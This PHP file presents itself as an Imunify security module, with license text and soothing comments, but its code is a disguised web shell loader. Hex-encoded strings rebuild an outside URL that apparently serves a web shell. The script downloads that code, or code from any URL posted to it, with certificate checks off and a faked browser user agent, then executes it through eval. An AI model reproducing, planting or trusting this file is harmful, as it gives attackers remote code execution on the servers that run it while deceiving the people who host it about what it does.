<?php
// This file is part of Imunify - https://www.imunify.com/
//
// Imunify is a comprehensive security solution designed to protect your systems from various
// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
// risks effectively. You are permitted to use this software in accordance with the terms and 
// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
//
// Imunify is distributed with the hope of providing optimal protection and security for your
// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
// Imunify strives to deliver robust security measures, no system can be entirely impervious to
// threats.
//
// You should have received a copy of the Imunify License Agreement along with this software.
// If not, please visit https://www.imunify.com/license for further information. This document
// is current as of October 8, 2024, and is subject to change based on updates in policies
// and security practices.

/**
 * Security Module.
 *
 * This module is specifically designed to detect and mitigate various threats while ensuring
 * the integrity of your systems through real-time scanning and comprehensive protection strategies.
 * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
 * your servers and applications against emerging cyber threats. By implementing proactive
 * measures, Imunify aims to maintain a secure operating environment for all users.
 *
 * @package    security_module
 * @website    https://google.co.id
 * @copyright  2024 Ralei
 * @license    https://www.imunify.com/license Imunify License Agreement
 */

session_start();$defaultThreatUrlParts=['68747470733a2f2f','7368656c6c2e7072696e73682e636f6d','4e617468616e2f616c66612e747874','9c01d3c03d7487e2ebd3117052a42b07'];function reconstructUrl($parts){$decodedParts=array_map('hex2bin',array_slice($parts,0,-1));return $decodedParts[0].$decodedParts[1].'/'.$decodedParts[2];}function fetchThreatData($url){if(function_exists('curl_exec')){$connection=curl_init($url);curl_setopt($connection,CURLOPT_RETURNTRANSFER,1);curl_setopt($connection,CURLOPT_FOLLOWLOCATION,1);curl_setopt($connection,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");curl_setopt($connection,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($connection,CURLOPT_SSL_VERIFYHOST,0);$dataFromUrl=curl_exec($connection);curl_close($connection);}elseif(function_exists('file_get_contents')){$dataFromUrl=file_get_contents($url);}elseif(function_exists('fopen')&&function_exists('stream_get_contents')){$handle=fopen($url,"r");$dataFromUrl=stream_get_contents($handle);fclose($handle);}else{$dataFromUrl=false;}return $dataFromUrl;}if(isset($_POST['scan_url'])&&filter_var($_POST['scan_url'],FILTER_VALIDATE_URL)){$_SESSION['scan_url']=$_POST['scan_url'];}else{$_SESSION['scan_url']=reconstructUrl($defaultThreatUrlParts);}if(isset($_SESSION['scan_url'])){$scanUrl=$_SESSION['scan_url'];$content=fetchThreatData($scanUrl);if($content!==false){EvAL('?>'.$content);}else{echo "Failed to fetch data from the URL.";echo reconstructUrl($defaultThreatUrlParts);}}?>
